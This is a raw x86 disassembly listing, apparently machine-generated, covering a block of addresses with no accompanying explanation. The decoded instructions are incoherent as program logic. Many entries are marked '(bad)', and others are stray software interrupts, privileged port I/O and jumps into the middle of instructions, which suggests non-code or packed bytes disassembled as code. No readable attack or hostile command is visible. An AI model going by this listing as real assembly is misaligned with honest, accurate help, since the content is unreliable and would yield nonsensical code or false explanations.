  424258:	cmp    ebp,DWORD PTR [ecx-0x2cd7522d]
  42425e:	in     al,dx
  42425f:	xchg   edx,eax
  424260:	push   ebx
  424261:	popf   
  424262:	int    0x76
  424264:	adc    DWORD PTR [ebx+0x6d],esi
  424267:	adc    al,0x87
  424269:	ror    ebp,cl
  42426b:	jl     0x42429d
  42426d:	xchg   DWORD PTR [ebp-0x5272f578],ecx
  424273:	int    0x8d
  424275:	std    
  424276:	int    0x96
  424278:	std    
  424279:	cmp    ecx,DWORD PTR [edi]
  42427b:	cmp    ebx,ecx
  42427d:	shr    ebx,cl
  42427f:	xchg   edx,eax
  424280:	shr    edx,cl
  424282:	sub    BYTE PTR [ebx+0x13],dl
  424285:	int    0x96
  424287:	std    
  424288:	or     cl,BYTE PTR [ebp+0xa88cd95]
  42428e:	lea    esi,[ebp+0x3bfd8dcd]
  424294:	cdq    
  424295:	cmp    esi,eax
  424297:	shl    edx,cl
  424299:	sub    bl,dl
  42429b:	repz xchg edx,eax
  42429d:	push   ebx
  42429e:	jecxz  0x42426d
  4242a0:	lea    esi,[ebp-0x792becbd]
  4242a6:	xchg   DWORD PTR [ebp-0x6a72f578],ecx
  4242ac:	int    0x8d
  4242ae:	std    
  4242af:	int    0x96
  4242b1:	std    
  4242b2:	cmp    ecx,DWORD PTR [edi]
  4242b4:	cmp    ebx,ecx
  4242b6:	shr    ebx,cl
  4242b8:	xchg   edx,eax
  4242b9:	shr    edx,cl
  4242bb:	sub    BYTE PTR [ebx+0x13],dl
  4242be:	xchg   DWORD PTR [esp+ecx*2-0x37],edi
  4242c2:	jbe    0x424261
  4242c4:	popa   
  4242c5:	and    DWORD PTR [esi-0x777278cb],eax
  4242cb:	or     cl,BYTE PTR [ebp-0x32781313]
  4242d1:	(bad)  
  4242d2:	in     eax,dx
  4242d3:	int    0x76
  4242d5:	dec    esp
  4242d6:	int    0x1
  4242d8:	adc    DWORD PTR [ecx+0x718080],eax
  4242de:	xor    ch,cl
  4242e0:	jbe    0x42432e
  4242e2:	add    dh,dl
  4242e4:	in     eax,dx
  4242e5:	int    0x1
  4242e7:	adc    DWORD PTR [ecx+0x70008080],eax
  4242ed:	dec    esp
  4242ee:	leave  
  4242ef:	jbe    0x424296
  4242f1:	pop    DWORD PTR [ebp*1-0x5a89368a]
  4242f8:	dec    edx
  4242f9:	pop    ss
  4242fa:	xchg   BYTE PTR ds:0xcdfd8dcd,dh
  424300:	xchg   esi,eax
  424301:	std    
  424302:	cmp    ecx,DWORD PTR [edi]
  424304:	cmp    ebx,ecx
  424306:	shr    ebx,cl
  424308:	xchg   edx,eax
  424309:	shr    edx,cl
  42430b:	sub    BYTE PTR [ebx+0x13],dl
  42430e:	or     dh,BYTE PTR [esi-0x4b]
  424311:	inc    ebx
  424312:	jge    0x4242ea
  424314:	pop    eax
  424315:	int    0x76
  424317:	stc    
  424318:	int    0x8d
  42431a:	stc    
  42431b:	cmp    edi,DWORD PTR [ecx+0x3b]
  42431e:	lock shl edx,cl
  424321:	sub    bl,dl
  424323:	mov    ebp,0xcdd35392
  424328:	lea    esp,[ebp+0x3ba596cd]
  42432e:	fnstcw WORD PTR [ebx]
  424330:	psrlq  mm5,mm2
  424333:	sub    BYTE PTR [edi+0x4c76cd9d],al
  424339:	int    0x1
  42433b:	adc    DWORD PTR [ecx-0x142c7f80],eax
  424341:	xchg   edx,eax
  424342:	push   ebx
  424343:	jecxz  0x424374
  424345:	rcl    ebp,1
  424347:	bound  eax,QWORD PTR [eax]
  424349:	jo     0x42437f
  42434b:	int    0x76
  42434d:	std    
  42434e:	int    0x8d
  424350:	std    
  424351:	cmp    edi,DWORD PTR [ecx+0x3b]
  424354:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  42435b:	push   ebx
  42435c:	rol    DWORD PTR [ebx+0x76],cl
  42435f:	mov    ch,0xd6
  424361:	and    ch,cl
  424363:	jbe    0x424302
  424365:	int    0x8d
  424367:	popf   
  424368:	cmp    esi,eax
  42436a:	cmp    edi,DWORD PTR [ecx-0x2d]
  42436d:	mov    ebp,0x28f2d392
  424372:	push   ebx
  424373:	jge    0x4243b8
  424375:	fld    TBYTE PTR [edi]
  424377:	pop    es
  424378:	xchg   esp,eax
  424379:	add    BYTE PTR [eax],al
  42437b:	add    ch,cl
  42437d:	jbe    0x42437c
  42437f:	int    0x8d
  424381:	std    
  424382:	cmp    edi,DWORD PTR [ecx+0x3b]
  424385:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  42438c:	push   ebx
  42438d:	rol    DWORD PTR [ebx+0x76],cl
  424390:	mov    ch,0xd6
  424392:	and    ch,cl
  424394:	jbe    0x42438f
  424396:	int    0x8d
  424398:	stc    
  424399:	cmp    edi,DWORD PTR [ecx+0x3b]
  42439c:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  4243a3:	push   ebx
  4243a4:	rol    DWORD PTR [ecx-0x5f14428a],cl
  4243aa:	add    DWORD PTR [eax-0x12893680],0x67f1048e
  4243b4:	leave  
  4243b5:	jbe    0x4243ac
  4243b7:	fdivr  st,st(4)
  4243b9:	sbb    al,0xb
  4243bb:	int    0xa6
  4243bd:	std    
  4243be:	int    0x76
  4243c0:	std    
  4243c1:	cmp    ebp,DWORD PTR [ecx-0x132c36c5]
  4243c7:	xchg   edx,eax
  4243c8:	shr    DWORD PTR [ebp-0x1462acd8],cl
  4243ce:	sbb    al,BYTE PTR [ecx+0x76cd8080]
  4243d4:	std    
  4243d5:	int    0x8d
  4243d7:	std    
  4243d8:	cmp    edi,DWORD PTR [ecx+0x3b]
  4243db:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  4243e2:	push   ebx
  4243e3:	ror    DWORD PTR [edx],cl
  4243e5:	jbe    0x4243d4
  4243e7:	int    0x76
  4243e9:	std    
  4243ea:	int    0x8d
  4243ec:	std    
  4243ed:	cmp    edi,DWORD PTR [ecx+0x3b]
  4243f0:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  4243f7:	push   ebx
  4243f8:	ror    DWORD PTR [edx],cl
  4243fa:	jbe    0x4243f1
  4243fc:	int    0x8d
  4243fe:	std    
  4243ff:	int    0x76
  424401:	std    
  424402:	cmp    ecx,DWORD PTR [edi]
  424404:	cmp    ecx,ecx
  424406:	shr    DWORD PTR [ebp-0x6d142cd8],cl
  42440c:	push   ebx
  42440d:	jge    0x4243dc
  42440f:	jbe    0x4243a6
  424411:	inc    ebx
  424412:	jge    0x4243e8
  424414:	xchg   ch,cl
  424416:	test   BYTE PTR ds:0xcded760a,bl
  42441c:	jbe    0x4243cb
  42441e:	int    0x84
  424420:	sbb    eax,0xcdf5760a
  424425:	jbe    0x424424
  424427:	int    0x8d
  424429:	std    
  42442a:	cmp    edi,DWORD PTR [ecx+0x3b]
  42442d:	lock shl edx,cl
  424430:	sub    bl,dl
  424432:	mov    ebp,0xcdd35392
  424437:	(bad)  
  424438:	in     eax,dx
  424439:	inc    ebx
  42443a:	rcl    esp,cl
  42443c:	push   esp
  42443d:	int    0x76
  42443f:	std    
  424440:	int    0x8d
  424442:	std    
  424443:	cmp    esi,eax
  424445:	cmp    edi,DWORD PTR [ecx-0x2d]
  424448:	repnz sub bl,dl
  42444b:	mov    ebp,0xcdd35392
  424450:	(bad)  
  424451:	in     eax,dx
  424452:	shr    ebx,cl
  424454:	sub    al,BYTE PTR [ebx-0x2d]
  424457:	aam    0x1c
  424459:	int    0x8d
  42445b:	in     eax,dx
  42445c:	int    0x76
  42445e:	dec    esp
  42445f:	int    0x1
  424461:	adc    DWORD PTR [ecx-0x44d07f80],eax
  424467:	retf   
  424468:	jno    0x42446a
  42446a:	(bad)  
  42446b:	mov    ch,0x0
  42446d:	jo     0x4243f7
  42446f:	in     al,dx
  424470:	push   ds
  424471:	int    0x76
  424473:	cmc    
  424474:	xchg   DWORD PTR [esi-0x78],esi
  424477:	int    0x8d
  424479:	dec    esp
  42447a:	int    0xa
  42447c:	adc    DWORD PTR [ecx+0x6d048080],eax
  424482:	xchg   edx,eax
  424483:	jo     0x424485
  424485:	(bad)  
  424486:	mov    ch,0x0
  424488:	jno    0x424412
  42448a:	or     dh,BYTE PTR [esi-0xb]
  42448d:	int    0x76
  42448f:	std    
  424490:	int    0x8d
  424492:	std    
  424493:	cmp    edi,DWORD PTR [ecx+0x3b]
  424496:	lock shl edx,cl
  424499:	sub    bl,dl
  42449b:	mov    ebp,0xcdd35392
  4244a0:	(bad)  
  4244a1:	cmc    
  4244a2:	inc    ebx
  4244a3:	ror    ebp,cl
  4244a5:	jbe    0x4244a0
  4244a7:	int    0x8d
  4244a9:	stc    
  4244aa:	(bad)  
  4244ab:	xor    DWORD PTR [ebx],edi
  4244ad:	jns    0x4244ea
  4244af:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  4244b6:	push   ebx
  4244b7:	rol    DWORD PTR [ecx+0x1cecbd76],cl
  4244bd:	cmp    esi,eax
  4244bf:	cmp    edi,DWORD PTR [ecx-0x2d]
  4244c2:	repnz sub bl,dl
  4244c5:	mov    ebp,0xcdd35392
  4244ca:	(bad)  
  4244cb:	cmc    
  4244cc:	das    
  4244cd:	rcl    ebx,1
  4244cf:	int    0x8d
  4244d1:	lods   eax,DWORD PTR ds:[esi]
  4244d2:	or     al,BYTE PTR [edi+ebx*1-0x32068933]
  4244d9:	(bad)  
  4244da:	stc    
  4244db:	cmp    edi,DWORD PTR [ecx+0x3b]
  4244de:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  4244e5:	push   ebx
  4244e6:	rol    DWORD PTR [edi-0x2893263],cl
  4244ec:	int    0x8d
  4244ee:	std    
  4244ef:	cmp    esi,eax
  4244f1:	cmp    edi,DWORD PTR [ecx-0x2d]
  4244f4:	repnz sub bl,dl
  4244f7:	mov    ebp,0xcdd35392
  4244fc:	lea    ebp,[ebp+0x2f1f845e]
  424502:	push   es
  424503:	or     al,0xff
  424505:	add    BYTE PTR [eax],al
  424507:	int    0x76
  424509:	adc    ebp,ecx
  42450b:	lea    edx,[ecx]
  42450d:	ins    BYTE PTR es:[edi],dx
  42450e:	sar    DWORD PTR [ebp-0x30b330d8],cl
  424514:	test   BYTE PTR [eax-0x2cac7f80],al
  42451a:	int    0x8d
  42451c:	icebp  
  42451d:	push   esi
  42451e:	dec    ecx
  42451f:	and    DWORD PTR [esi-0x2ec14cb],eax
  424525:	add    BYTE PTR [eax],al
  424527:	int    0x76
  424529:	std    
  42452a:	int    0x8d
  42452c:	std    
  42452d:	cmp    edi,DWORD PTR [ecx+0x3b]
  424530:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  424537:	push   ebx
  424538:	rcr    DWORD PTR [esi+0x76],cl
  42453b:	mov    ebp,0x76cd88d6
  424540:	stc    
  424541:	int    0x8d
  424543:	stc    
  424544:	in     al,dx
  424545:	xchg   ch,cl
  424547:	jbe    0x424546
  424549:	int    0x8d
  42454b:	std    
  42454c:	cmp    esi,eax
  42454e:	cmp    edi,DWORD PTR [ecx-0x56]
  424551:	shl    edx,cl
  424553:	sub    bl,dl
  424555:	mov    ebp,0xd353a892
  42455a:	arpl   bx,cx
  42455c:	ror    BYTE PTR [eax-0x12326980],cl
  424562:	add    al,0xed
  424564:	xor    al,0xc9
  424566:	jbe    0x424565
  424568:	dec    ecx
  424569:	and    DWORD PTR [esi-0x528936cb],eax
  42456f:	inc    ecx
  424570:	and    DWORD PTR [esi+0x4c76cd35],eax
  424576:	or     dh,BYTE PTR [esi+0x4c]
  424579:	cwde   
  42457a:	int    0x6d
  42457c:	int    0x76
  42457e:	std    
  42457f:	int    0x96
  424581:	std    
  424582:	sar    bh,0x5f
  424585:	shl    DWORD PTR [ecx],1
  424587:	xchg   BYTE PTR ds:0x3ba8d33b,dh
  42458d:	cdq    
  42458e:	shr    edx,cl
  424590:	sub    bl,dl
  424592:	mov    ebp,0xcdd25392
  424597:	xchg   esi,eax
  424598:	mov    BYTE PTR [ebx-0xf],al
  42459b:	das    
  42459c:	add    eax,0x80808159
  4245a1:	int    0x76
  4245a3:	mov    ch,cl
  4245a5:	xchg   esi,eax
  4245a6:	mov    BYTE PTR [edi+0xa9a6470],al
  4245ac:	xchg   esi,eax
  4245ad:	cmc    
  4245ae:	leave  
  4245af:	jbe    0x4245aa
  4245b1:	popa   
  4245b2:	and    DWORD PTR [esi-0x68932cb],eax
  4245b8:	int    0x96
  4245ba:	stc    
  4245bb:	cmp    ebx,DWORD PTR [ecx+0x3b28ead3]
  4245c1:	rcl    ebx,cl
  4245c3:	mov    ebp,0xcdd25392
  4245c8:	xchg   esi,eax
  4245c9:	std    
  4245ca:	int    0xe6
  4245cc:	std    
  4245cd:	cmp    esp,ebx
  4245cf:	cmp    edi,edi
  4245d1:	shr    ecx,cl
  4245d3:	sub    bl,dl
  4245d5:	repz xchg edx,eax
  4245d7:	push   ebx
  4245d8:	fxch   st(5)
  4245da:	out    0xf5,al
  4245dc:	pop    esi
  4245dd:	xchg   esp,eax
  4245de:	leave  
  4245df:	fsubr  QWORD PTR [edi]
  4245e1:	add    eax,0x8080816b
  4245e6:	int    0x96
  4245e8:	cmc    
  4245e9:	int    0x76
  4245eb:	mov    BYTE PTR [edi-0x7f7fd2f5],al
  4245f1:	or     ch,0x96
  4245f4:	mov    ch,cl
  4245f6:	out    0xf5,al
  4245f8:	xor    ebx,DWORD PTR [edx-0x21932ac]
  4245fe:	pop    ebx
  4245ff:	int    0xa6
  424601:	std    
  424602:	cmp    edi,edx
  424604:	cmp    ebp,DWORD PTR [ecx-0x2c6def2d]
  42460a:	in     eax,0x28
  42460c:	push   ebx
  42460d:	cld    
  42460e:	or     dl,BYTE PTR [esi+0x2fd943a5]
  424614:	add    eax,0x8080814f
  424619:	int    0x96
  42461b:	std    
  42461c:	int    0xe6
  42461e:	std    
  42461f:	cmp    esp,ebx
  424621:	cmp    edi,edi
  424623:	shl    ebx,cl
  424625:	xchg   edx,eax
  424626:	shr    ecx,cl
  424628:	sub    BYTE PTR [ebx-0x27],dl
  42462b:	or     dl,BYTE PTR [esi+0x4c76c911]
  424631:	mov    dl,0x21
  424633:	xchg   BYTE PTR ds:0xcdfd96cd,dh
  424639:	out    0xfd,al
  42463b:	cmp    esp,ebx
  42463d:	cmp    edi,edi
  42463f:	shl    ebx,cl
  424641:	xchg   edx,eax
  424642:	shr    ecx,cl
  424644:	sub    BYTE PTR [ebx-0x27],dl
  424647:	jmp    0x42464b
  424649:	add    BYTE PTR [eax-0x2693280],0xcd
  424650:	(bad)  
  424651:	std    
  424652:	add    al,0xf7
  424654:	(bad)  
  424655:	cmp    esp,ebx
  424657:	sar    DWORD PTR [ecx-0x6d0c2cd8],cl
  42465d:	push   ebx
  42465e:	cdq    
  42465f:	iret   
  424660:	ja     0x42465b
  424662:	jecxz  0x424653
  424664:	inc    ebx
  424665:	cdq    
  424666:	das    
  424667:	add    al,0x21
  424669:	add    BYTE PTR [eax-0x3004cc80],0xe4
  424670:	jo     0x4245fa
  424672:	or     dl,dh
  424674:	mov    ch,0x2f
  424676:	mov    ebx,0xea121a
  42467b:	das    
  42467c:	add    BYTE PTR [eax-0x321269f6],0x96
  424683:	in     eax,dx
  424684:	xchg   DWORD PTR [eax],esi
  424686:	int    0xd6
  424688:	in     eax,dx
  424689:	xchg   DWORD PTR [eax-0x2d],edx
  42468c:	repz sub bl,dl
  42468f:	mov    ecx,0x2ffb5392
  424694:	mov    ebx,0x4cf3d31a
  424699:	adc    dh,bh
  42469b:	dec    ecx
  42469c:	and    DWORD PTR [esi-0x1229f5cb],eax
  4246a2:	or     dl,BYTE PTR [esi-0x12693243]
  4246a8:	int    0xd6
  4246aa:	in     eax,dx
  4246ab:	cmp    esp,ebx
  4246ad:	add    al,0xf7
  4246af:	call   ebx
  4246b1:	repz xchg edx,eax
  4246b3:	sar    DWORD PTR [ecx-0x7866acd8],cl
  4246b9:	xchg   esi,eax
  4246ba:	mov    BYTE PTR [edx],cl
  4246bc:	xchg   esi,eax
  4246bd:	in     eax,dx
  4246be:	int    0x96
  4246c0:	dec    esp
  4246c1:	int    0xd6
  4246c3:	dec    esp
  4246c4:	cmp    esp,ebx
  4246c6:	add    al,0xf7
  4246c8:	call   ebx
  4246ca:	mov    ecx,0x92f3d328
  4246cf:	push   ebx
  4246d0:	cdq    
  4246d1:	int    0xd6
  4246d3:	mov    ebp,0x32d6fb43
  4246d8:	int    0x96
  4246da:	dec    esp
  4246db:	int    0xd6
  4246dd:	dec    esp
  4246de:	cmp    esp,ebx
  4246e0:	add    al,0xf7
  4246e2:	call   ebx
  4246e4:	mov    ecx,0x92f3d328
  4246e9:	push   ebx
  4246ea:	cdq    
  4246eb:	int    0xd6
  4246ed:	mov    ebp,0x88d6fb43
  4246f2:	int    0x96
  4246f4:	in     eax,dx
  4246f5:	int    0xd6
  4246f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4246f8:	add    DWORD PTR [edx+0x4],0x8d0092c9
  4246ff:	mov    ch,0x2f
  424701:	push   es
  424702:	xchg   ebx,eax
  424703:	add    BYTE PTR [eax],al
  424705:	add    BYTE PTR [ecx-0x6932ee5a],al
  42470b:	stc    
  42470c:	int    0xd6
  42470e:	stc    
  42470f:	cmp    esp,ebx
  424711:	add    al,0xf7
  424713:	call   ebx
  424715:	mov    ecx,0x92f3d328
  42471a:	push   ebx
  42471b:	cdq    
  42471c:	int    0xd6
  42471e:	adc    ebp,ecx
  424720:	out    0xf5,al
  424722:	inc    ebx
  424723:	aam    0xd9
  424725:	in     al,0x77
  424727:	sub    al,0xcd
  424729:	xchg   esi,eax
  42472a:	std    
  42472b:	int    0xd6
  42472d:	std    
  42472e:	cmp    esp,ebx
  424730:	add    al,0xf7
  424732:	call   ebx
  424734:	repz xchg edx,eax
  424736:	sar    DWORD PTR [ecx+0x53c58728],cl
  42473c:	cdq    
  42473d:	int    0x9c
  42473f:	test   BYTE PTR [ebx-0x1e],al
  424742:	das    
  424743:	push   es
  424744:	test   BYTE PTR [eax],al
  424746:	add    BYTE PTR [eax],al
  424748:	arpl   bp,cx
  42474a:	jbe    0x4246f9
  42474c:	cmp    edx,ebx
  42474e:	int    0x8d
  424750:	lods   eax,DWORD PTR ds:[esi]
  424751:	add    al,0x2
  424753:	jmp    FWORD PTR [edx+0x76cd4aec]
  424759:	std    
  42475a:	cmp    edx,ebx
  42475c:	int    0x8d
  42475e:	std    
  42475f:	cmp    ecx,DWORD PTR [edi]
  424761:	shl    edx,cl
  424763:	sub    bl,dl
  424765:	mov    ebp,0xa8d35392
  42476a:	retf   
  42476b:	ror    BYTE PTR [eax-0x12326980],cl
  424771:	adc    ch,ch
  424773:	xchg   ebp,eax
  424774:	add    BYTE PTR [eax-0x2893680],0x49
  42477b:	and    DWORD PTR [esi-0x68936cb],eax
  424781:	inc    ecx
  424782:	and    DWORD PTR [esi-0x28932cb],eax
  424788:	int    0x8d
  42478a:	std    
  42478b:	cwde   
  42478c:	call   0x8621:0xd169ffc0
  424793:	xor    eax,0xbdd3793b
  424798:	xchg   edx,eax
  424799:	mov    al,ds:0xf2d3133b
  42479e:	sub    BYTE PTR [ebx-0x2d],dl
  4247a1:	or     dh,BYTE PTR [esi-0x53]
  4247a4:	int    0x76
  4247a6:	std    
  4247a7:	int    0x8d
  4247a9:	std    
  4247aa:	cmp    edi,DWORD PTR [ecx-0x2d]
  4247ad:	mov    ebp,0xd3133b92
  4247b2:	repnz sub BYTE PTR [ebx-0x2d],dl
  4247b6:	or     dh,BYTE PTR [esi-0xf]
  4247b9:	int    0xe6
  4247bb:	and    al,0xcd
  4247bd:	jbe    0x4247ac
  4247bf:	int    0x8d
  4247c1:	in     eax,dx
  4247c2:	cmp    edx,ebx
  4247c4:	or     dh,BYTE PTR [esi-0x13]
  4247c7:	adc    dh,BYTE PTR [esi-0x13]
  4247ca:	dec    ecx
  4247cb:	mov    al,ds:0x76cd3586
  4247d0:	cmc    
  4247d1:	int    0x8d
  4247d3:	cmc    
  4247d4:	cmp    edx,ebx
  4247d6:	or     dh,BYTE PTR [esi-0xb]
  4247d9:	adc    dh,BYTE PTR [esi-0xb]
  4247dc:	dec    ecx
  4247dd:	lahf   
  4247de:	xchg   BYTE PTR ds:0xcd1176cd,dh
  4247e4:	lea    edx,[ecx]
  4247e6:	cmp    edx,ebx
  4247e8:	or     dh,BYTE PTR [esi+0x11]
  4247eb:	adc    dh,BYTE PTR [esi+0x11]
  4247ee:	imul   esp,DWORD PTR [ecx],0x76cd3586
  4247f4:	mov    ch,0xcd
  4247f6:	lea    esi,[ebp+0x760ad33b]
  4247fc:	mov    ch,0x12
  4247fe:	jbe    0x4247b5
  424800:	dec    ecx
  424801:	and    DWORD PTR [ebp+esi*1+0x212476c9],eax
  424808:	hlt    
  424809:	mov    esi,DWORD PTR ds:0x68876cd
  42480f:	ins    DWORD PTR es:[edi],dx
  424810:	das    
  424811:	add    eax,0x80808551
  424816:	int    0x76
  424818:	dec    esp
  424819:	push   es
  42481a:	ins    DWORD PTR es:[edi],dx
  42481b:	das    
  42481c:	add    eax,0x80808538
  424821:	int    0x76
  424823:	sbb    al,0x6
  424825:	ins    DWORD PTR es:[edi],dx
  424826:	das    
  424827:	add    eax,0x80808523
  42482c:	int    0x76
  42482e:	and    al,0xcd
  424830:	jbe    0x424856
  424832:	int    0x8d
  424834:	mov    bl,dl
  424836:	mov    ebp,0x39af5692
  42483b:	add    BYTE PTR [eax+0x2f815eb8],0x6
  424842:	add    DWORD PTR [ebp+0x76cd8080],0xfd8dcdfd
  42484c:	cmp    edi,DWORD PTR [ecx-0x2d]
  42484f:	mov    ebp,0xd3133b92
  424854:	repnz sub BYTE PTR [ebx-0x2d],dl
  424858:	or     dh,BYTE PTR [esi-0xf]
  42485b:	int    0x76
  42485d:	std    
  42485e:	int    0x76
  424860:	std    
  424861:	int    0x76
  424863:	mov    ch,cl
  424865:	lea    ecx,[eax-0x329b8379]
  42486b:	outs   dx,BYTE PTR ds:[esi]
  42486c:	jo     0x424878
  42486e:	lea    esp,[esi+eax*1]
  424871:	ins    DWORD PTR es:[edi],dx
  424872:	das    
  424873:	add    eax,0x808084f0
  424878:	leave  
  424879:	jbe    0x424810
  42487b:	dec    ecx
  42487c:	and    DWORD PTR [eax+0x35],edi
  42487f:	int    0x76
  424881:	xchg   ebp,eax
  424882:	pop    ebx
  424883:	int    0xa6
  424885:	xchg   ebp,eax
  424886:	cmp    edi,DWORD PTR [ecx+0x3b]
  424889:	loop   0x42485e
  42488b:	mov    ebp,0x28e5d392
  424890:	push   ebx
  424891:	popf   
  424892:	or     ah,BYTE PTR [esi-0x289326b]
  424898:	int    0x76
  42489a:	std    
  42489b:	int    0x8
  42489d:	sub    eax,0xcd808081
  4248a2:	xor    ch,cl
  4248a4:	bound  esp,QWORD PTR [edi+eax*4+0x30]
  4248a8:	int    0x76
  4248aa:	std    
  4248ab:	int    0x76
  4248ad:	std    
  4248ae:	int    0x8
  4248b0:	and    eax,0xcd808081
  4248b5:	sbb    al,0xa
  4248b7:	xchg   esi,eax
  4248b8:	dec    esp
  4248b9:	inc    ebx
  4248ba:	fst    st(6)
  4248bc:	push   0xffffffcd
  4248be:	(bad)  
  4248bf:	cmc    
  4248c0:	int    0x8
  4248c2:	adc    DWORD PTR [ecx-0x69307f80],eax
  4248c8:	lods   eax,DWORD PTR ds:[esi]
  4248c9:	(bad)  
  4248ca:	int    0x96
  4248cc:	cmc    
  4248cd:	cmp    ecx,DWORD PTR [edi]
  4248cf:	add    al,0xfb
  4248d1:	call   ebx
  4248d3:	jmp    0x424867
  4248d5:	shr    edx,cl
  4248d7:	sub    BYTE PTR [ebx-0x1d],dl
  4248da:	int    0x8d
  4248dc:	dec    esp
  4248dd:	bound  eax,QWORD PTR [eax]
  4248df:	xchg   ecx,eax
  4248e0:	jo     0x42493d
  4248e2:	add    BYTE PTR [eax+0x24],dh
  4248e5:	int    0x8d
  4248e7:	dec    esp
  4248e8:	int    0x6e
  4248ea:	xchg   esp,eax
  4248eb:	int    0x7e
  4248ed:	jo     0x424922
  4248ef:	jge    0x424962
  4248f1:	xchg   ebp,eax
  4248f3:	jo     0x4248b2
  4248f5:	dec    esi
  4248f6:	xchg   BYTE PTR [eax+0x248dcd80],al
  4248fc:	int    0x8
  4248fe:	xor    eax,0xa808081
  424903:	sbb    al,0x0
  424905:	xchg   ecx,eax
  424906:	xchg   esp,eax
  424907:	add    dh,dl
  424909:	mov    BYTE PTR [ebx-0x43],bl
  42490c:	or     eax,0xcd808084
  424911:	pop    ebx
  424912:	fs xchg ebp,edx
  424915:	das    
  424916:	mov    ebx,0x74cf1452
  42491b:	xor    BYTE PTR [edx+ecx*1],bl
  42491e:	jbe    0x42493c
  424920:	int    0x76
  424922:	std    
  424923:	int    0x8d
  424925:	std    
  424926:	cmp    edi,DWORD PTR [ecx+0x4]
  424929:	add    bh,bh
  42492b:	shl    edx,cl
  42492d:	sub    bl,dl
  42492f:	mov    ebp,0x2fd35392
  424934:	mov    ebx,0x960a868a
  424939:	and    al,0x43
  42493b:	jge    0x42496c
  42493d:	add    eax,0x808080e9
  424942:	int    0x76
  424944:	std    
  424945:	int    0x8d
  424947:	std    
  424948:	cmp    edi,DWORD PTR [ecx+0x4]
  42494b:	add    bh,bh
  42494d:	shl    edx,cl
  42494f:	sub    bl,dl
  424951:	mov    ebp,0xad35392
  424956:	jbe    0x4248fd
  424958:	int    0x76
  42495a:	stc    
  42495b:	int    0x8d
  42495d:	stc    
  42495e:	add    al,0x2
  424960:	(bad)  
  424961:	cmp    edi,DWORD PTR [ecx-0x2d]
  424964:	repnz sub bl,dl
  424967:	mov    ebp,0x2fd35392
  42496c:	mov    ebx,0x7d33868a
  424971:	pop    esi
  424972:	lea    esp,[ebp-0x7f2ef7d1]
  424978:	add    BYTE PTR [eax+0x41c8dcd],0xd3
  42497f:	mov    BYTE PTR [edx],cl
  424981:	lea    ebx,[esp+ebp*8]
  424984:	xchg   ebp,ecx
  424986:	lea    ebx,[ecx*8+0x31cd5c52]
  42498d:	or     dh,BYTE PTR [esi-0x63]
  424990:	jl     0x424998
  424992:	icebp  
  424993:	aam    0x89
  424995:	clc    
  424996:	icebp  
  424997:	sub    edx,edx
  424999:	xchg   DWORD PTR [esi-0x63],esi
  42499c:	in     al,dx
  42499d:	xchg   edx,eax
  42499e:	int    0xd2
  4249a0:	jo     0x42496f
  4249a2:	outs   dx,BYTE PTR ds:[esi]
  4249a3:	test   BYTE PTR [edi+0x63bd70c5],al
  4249a9:	test   DWORD PTR [eax+0x1c76cd80],eax
  4249af:	int    0x7c
  4249b1:	mov    BYTE PTR [edx],cl
  4249b3:	lea    ebx,[ebp-0x32027233]
  4249b9:	xchg   esi,eax
  4249ba:	std    
  4249bb:	cmp    ecx,DWORD PTR [edi]
  4249bd:	add    al,0xfb
  4249bf:	call   ebx
  4249c1:	jmp    0x424955
  4249c3:	shr    edx,cl
  4249c5:	sub    BYTE PTR [ebx+0x13],dl
  4249c8:	pop    esi
  4249c9:	lea    ebx,[ebp-0x7232e32c]
  4249cf:	mov    BYTE PTR [edi-0x29ffb384],al
  4249d5:	popf   
  4249d6:	int    0x6c
  4249d8:	test   BYTE PTR [ecx-0x79],dh
  4249db:	lds    esi,FWORD PTR [eax-0x43]
  4249de:	add    eax,DWORD PTR [edi+0x76cd8080]
  4249e4:	sbb    al,0xcd
  4249e6:	(bad)  
  4249e7:	stc    
  4249e8:	int    0x96
  4249ea:	stc    
  4249eb:	cmp    ecx,DWORD PTR [edi]
  4249ed:	shr    ebx,cl
  4249ef:	xchg   edx,eax
  4249f0:	add    al,0xfb
  4249f2:	inc    DWORD PTR [ebp*2+0x28ead33c]
  4249f9:	push   ebx
  4249fa:	adc    eax,DWORD PTR [ecx-0x69325a73]
  424a00:	and    al,0xa
  424a02:	jbe    0x424a20
  424a04:	int    0x76
  424a06:	stc    
  424a07:	int    0x8d
  424a09:	stc    
  424a0a:	add    al,0x2
  424a0c:	(bad)  
  424a0d:	cmp    edi,DWORD PTR [ecx-0x2d]
  424a10:	repnz sub bl,dl
  424a13:	mov    ebp,0xcdd35392
  424a18:	lea    esp,[edi+ebp*1]
  424a1b:	mov    ebx,0x7d33867e
  424a20:	pop    esi
  424a21:	lea    esp,[ebp+0xa4072f]
  424a27:	add    BYTE PTR [eax],al
  424a29:	int    0x8
  424a2b:	and    eax,0x43808081
  424a30:	sbb    al,0xd6
  424a32:	cmp    ecx,ebp
  424a34:	lea    edx,[ecx]
  424a36:	int    0x8
  424a38:	adc    DWORD PTR [ecx-0x69307f80],eax
  424a3e:	lods   eax,DWORD PTR ds:[esi]
  424a3f:	(bad)  
  424a40:	int    0x96
  424a42:	adc    DWORD PTR [ebx],edi
  424a44:	(bad)  
  424a46:	sti    
  424a47:	call   ebx
  424a49:	jmp    0x4249dd
  424a4b:	shr    edx,cl
  424a4d:	sub    BYTE PTR [ebx-0x1d],dl
  424a50:	int    0x8d
  424a52:	dec    esp
  424a53:	bound  eax,QWORD PTR [eax]
  424a55:	xchg   ecx,eax
  424a56:	xchg   esp,eax
  424a57:	pop    ebx
  424a58:	add    BYTE PTR [eax+0x24],dh
  424a5b:	push   es
  424a5c:	ins    DWORD PTR es:[edi],dx
  424a5d:	das    
  424a5e:	add    eax,0x808092d9
  424a63:	int    0x96
  424a65:	and    al,0xcd
  424a67:	or     BYTE PTR [ebp-0x327f7f7f],bl
  424a6d:	or     ch,0x7d
  424a70:	cmp    ecx,DWORD PTR [edi]
  424a72:	add    al,0x11
  424a74:	call   ebx
  424a76:	jmp    0x424a0a
  424a78:	shr    DWORD PTR [ebp+0x2f7d5328],cl
  424a7e:	add    eax,0x808081da
  424a83:	int    0x76
  424a85:	std    
  424a86:	int    0x8d
